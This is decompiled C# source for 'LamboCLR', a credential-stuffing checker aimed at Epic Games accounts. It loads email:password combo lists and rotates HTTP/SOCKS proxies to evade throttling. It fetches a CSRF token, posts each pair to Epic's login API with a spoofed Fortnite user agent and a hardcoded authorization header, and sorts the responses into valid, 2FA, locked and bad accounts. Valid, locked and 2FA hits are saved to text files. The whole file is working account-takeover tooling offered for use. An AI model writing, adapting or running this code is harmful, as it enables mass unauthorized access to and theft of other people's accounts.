using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using Colorful;
using Leaf.xNet;

namespace LamboCLR
{
    // Token: 0x02000002 RID: 2
    internal class CheckerHelper
    {
        // Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.total++;
                        }
                    }
                }
            }
        }

        // Token: 0x06000002 RID: 2 RVA: 0x000020E0 File Offset: 0x000002E0
        public static void LoadProxies(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper.proxytotal++;
                        }
                    }
                }
            }
        }

        // Token: 0x06000003 RID: 3 RVA: 0x00002178 File Offset: 0x00000378
        public static void WriteLogo()
        {
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write("LamboCLR", Color.Aqua);
            Colorful.Console.Write("] ", Color.White);
        }

        // Token: 0x06000004 RID: 4 RVA: 0x000021AC File Offset: 0x000003AC
        public static void UpdateTitle()
        {
            for (; ; )
            {
                CheckerHelper.CPM = CheckerHelper.CPM_aux;
                CheckerHelper.CPM_aux = 0;
                Colorful.Console.Clear();
                Colorful.Console.Write(CheckerHelper.logo + "\n", Color.White);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.threads.ToString(),
                    "/",
                    CheckerHelper.threads.ToString(),
                    "] Threads"
                }), Color.White);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.check.ToString(),
                    "/",
                    CheckerHelper.total.ToString(),
                    "] Checked Accounts"
                }), Color.Cyan);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.hits.ToString(),
                    "/",
                    CheckerHelper.check.ToString(),
                    "] Good Accounts"
                }), Color.LawnGreen);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.ffa.ToString(),
                    "/",
                    CheckerHelper.check.ToString(),
                    "] 2FA accounts"
                }), Color.DarkMagenta);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.locked.ToString(),
                    "/",
                    CheckerHelper.check.ToString(),
                    "] Temp Locked accounts"
                }), Color.Blue);
                Colorful.Console.WriteLine(string.Concat(new string[]
                {
                    "[",
                    CheckerHelper.bad.ToString(),
                    "/",
                    CheckerHelper.check.ToString(),
                    "] Bad Accounts"
                }), Color.Red);
                Colorful.Console.WriteLine("[" + (CheckerHelper.CPM * 60).ToString() + "] CPM", Color.Magenta);
                Colorful.Console.WriteLine("[" + CheckerHelper.err.ToString() + "] Proxy Errors", Color.Yellow);
                Thread.Sleep(1000);
            }
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002400 File Offset: 0x00000600
        public static void Check()
        {
            for (; ; )
            {
                try
                {
                    Interlocked.Increment(ref CheckerHelper.proxyindex);
                    using (HttpRequest req = new HttpRequest())
                    {
                        bool flag = CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>();
                        if (flag)
                        {
                            CheckerHelper.stop++;
                            break;
                        }
                        Interlocked.Increment(ref CheckerHelper.accindex);
                        string[] array = CheckerHelper.accounts[CheckerHelper.accindex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                        string text = array[0] + ":" + array[1];
                        try
                        {
                            Random random = new Random();
                            string proxy = CheckerHelper.proxies[random.Next(0, CheckerHelper.proxies.Count - 1)];
                            bool flag2 = CheckerHelper.proxytype == "HTTP";
                            if (flag2)
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            bool flag3 = CheckerHelper.proxytype == "SOCKS4";
                            if (flag3)
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            bool flag4 = CheckerHelper.proxytype == "SOCKS5";
                            if (flag4)
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            req.KeepAlive = true;
                            req.IgnoreProtocolErrors = true;
                            req.ConnectTimeout = 5000;
                            req.AllowAutoRedirect = false;
                            req.AddHeader("Accept", "application/json");
                            req.UserAgent = "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit";
                            req.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                            HttpResponse csrf = req.Get("https://www.epicgames.com/id/api/csrf", null);
                            CookieCollection cookies = csrf.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf");
                            try
                            {
                                req.AddHeader("x-xsrf-token", cookies["XSRF-TOKEN"].Value);
                            }
                            catch
                            {
                            }
                            HttpResponse testcsrf = req.Post("https://www.epicgames.com/id/api/login", string.Concat(new string[]
                            {
                                "email=",
                                WebUtility.UrlEncode(array[0]),
                                "&password=",
                                WebUtility.UrlEncode(array[1]),
                                "&rememberMe=true"
                            }), "application/x-www-form-urlencoded");
                            bool flag5 = testcsrf.ToString().Contains("Sorry the credentials you are using are invalid");
                            if (flag5)
                            {
                                CheckerHelper.bad++;
                                CheckerHelper.CPM_aux++;
                                CheckerHelper.check++;
                            }
                            else
                            {
                                bool flag6 = testcsrf.ToString().Contains("Sorry the account credentials you are using are invalid") || testcsrf.ToString().Contains("Real ID association is required") || testcsrf.ToString().Contains("Please reset your password to proceed with login");
                                if (flag6)
                                {
                                    CheckerHelper.bad++;
                                    CheckerHelper.check++;
                                    CheckerHelper.CPM_aux++;
                                }
                                else
                                {
                                    bool flag7 = testcsrf.ToString().Contains("errors.com.epicgames.common.throttled") || testcsrf.ToString().Contains("Process exited before completing");
                                    if (flag7)
                                    {
                                        CheckerHelper.accounts.Add(text);
                                    }
                                    else
                                    {
                                        bool flag8 = testcsrf.ToString().Contains("account has been locked because of too many invalid login attempts") || testcsrf.ToString().Contains("Sorry the account you are using is not active");
                                        if (flag8)
                                        {
                                            CheckerHelper.locked++;
                                            CheckerHelper.CPM_aux++;
                                            CheckerHelper.check++;
                                            CheckerHelper.Savelocked(text);
                                        }
                                        else
                                        {
                                            bool flag9 = testcsrf.ToString().Contains("Two-Factor authentication required to process");
                                            if (flag9)
                                            {
                                                CheckerHelper.ffa++;
                                                CheckerHelper.CPM_aux++;
                                                CheckerHelper.check++;
                                                CheckerHelper.Save2fa(text);
                                            }
                                            else
                                            {
                                                bool flag10 = testcsrf.ToString() == "";
                                                if (flag10)
                                                {
                                                    CheckerHelper.hits++;
                                                    CheckerHelper.check++;
                                                    CheckerHelper.CPM_aux++;
                                                    CheckerHelper.SaveValid(text);
                                                }
                                                else
                                                {
                                                    CheckerHelper.accounts.Add(text);
                                                    CheckerHelper.err++;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            CheckerHelper.accounts.Add(text);
                            CheckerHelper.err++;
                        }
                    }
                }
                catch
                {
                    CheckerHelper.err++;
                }
            }
        }

        // Token: 0x06000006 RID: 6 RVA: 0x000028E0 File Offset: 0x00000AE0
        public static void SaveValid(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("hits.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {
            }
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00002938 File Offset: 0x00000B38
        public static void Savelocked(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("Temp Locked.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {
            }
        }

        // Token: 0x06000008 RID: 8 RVA: 0x00002990 File Offset: 0x00000B90
        public static void Save2fa(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("2FA.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {
            }
        }

        // Token: 0x06000009 RID: 9 RVA: 0x000029E8 File Offset: 0x00000BE8
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new string[]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        // Token: 0x04000001 RID: 1
        public static int total;

        // Token: 0x04000002 RID: 2
        public static int bad = 0;

        // Token: 0x04000003 RID: 3
        public static int hits = 0;

        // Token: 0x04000004 RID: 4
        public static int locked = 0;

        // Token: 0x04000005 RID: 5
        public static int ffa = 0;

        // Token: 0x04000006 RID: 6
        public static int err = 0;

        // Token: 0x04000007 RID: 7
        public static int check = 0;

        // Token: 0x04000008 RID: 8
        public static int accindex = 0;

        // Token: 0x04000009 RID: 9
        public static List<string> proxies = new List<string>();

        // Token: 0x0400000A RID: 10
        public static string proxytype = "";

        // Token: 0x0400000B RID: 11
        public static int proxyindex = 0;

        // Token: 0x0400000C RID: 12
        public static int proxytotal = 0;

        // Token: 0x0400000D RID: 13
        public static int stop = 0;

        // Token: 0x0400000E RID: 14
        public static List<string> accounts = new List<string>();

        // Token: 0x0400000F RID: 15
        public static int CPM = 0;

        // Token: 0x04000010 RID: 16
        public static int CPM_aux = 0;

        // Token: 0x04000011 RID: 17
        public static int threads;

        // Token: 0x04000012 RID: 18
        public static string logo = "\r\n\r\n                        ██╗      █████╗ ███╗   ███╗██████╗  ██████╗  ██████╗██╗     ██████╗ \r\n                        ██║     ██╔══██╗████╗ ████║██╔══██╗██╔═══██╗██╔════╝██║     ██╔══██╗\r\n                        ██║     ███████║██╔████╔██║██████╔╝██║   ██║██║     ██║     ██████╔╝\r\n                        ██║     ██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║██║     ██║     ██╔══██╗\r\n                        ███████╗██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝╚██████╗███████╗██║  ██║\r\n                        ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝\r\n                                ";
    }
}
